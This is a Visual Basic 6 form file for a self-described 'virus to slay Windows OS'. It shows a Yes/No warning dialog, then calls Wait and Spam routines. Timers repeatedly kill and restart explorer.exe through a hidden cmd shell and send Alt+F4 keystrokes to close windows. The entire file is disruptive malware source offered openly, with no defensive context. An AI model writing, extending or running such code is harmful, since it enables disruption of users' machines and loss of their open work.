VERSION 5.00
Begin VB.Form Frm_main 
   Caption         =   "Warning"
   ClientHeight    =   2040
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   4185
   LinkTopic       =   "Form1"
   ScaleHeight     =   2040
   ScaleWidth      =   4185
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Begin VB.Timer tmr3 
      Left            =   3600
      Top             =   1320
   End
   Begin VB.Timer tmr2 
      Left            =   3600
      Top             =   720
   End
   Begin VB.Timer tmr1 
      Left            =   3600
      Top             =   120
   End
   Begin VB.CommandButton cmd2 
      Caption         =   "No"
      Height          =   615
      Left            =   2160
      TabIndex        =   3
      Top             =   1200
      Width           =   1215
   End
   Begin VB.CommandButton cmd1 
      Caption         =   "Yes"
      Height          =   615
      Left            =   360
      TabIndex        =   2
      Top             =   1200
      Width           =   1215
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "Do you still want to run it?"
      Height          =   180
      Left            =   120
      TabIndex        =   1
      Top             =   480
      Width           =   2520
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "This is a virus to slay Windows OS."
      Height          =   180
      Left            =   120
      TabIndex        =   0
      Top             =   240
      Width           =   3150
   End
End
Attribute VB_Name = "Frm_main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmd1_Click()
    Call Wait
    Call Spam
End Sub

Private Sub cmd2_Click()
    End
End Sub

Private Sub Form_Load()
    App.Title = "Warning"
    tmr1.Interval = 2000
    tmr2.Interval = 30000
    tmr3.Interval = 60000
End Sub

Private Sub tmr1_Timer()
    If sign = True Then Call Suspend
End Sub

Private Sub tmr2_Timer()
    If sign = True Then
        Shell "cmd /c taskkill /im /f explorer.exe", 0
        Shell "cmd /c start explorer.exe", 0
    End If
End Sub

Private Sub tmr3_Timer()
    If sign = True Then
        SendKeys "%{F4}"
        SendKeys "{Shift}{Tab}"
    End If
End Sub
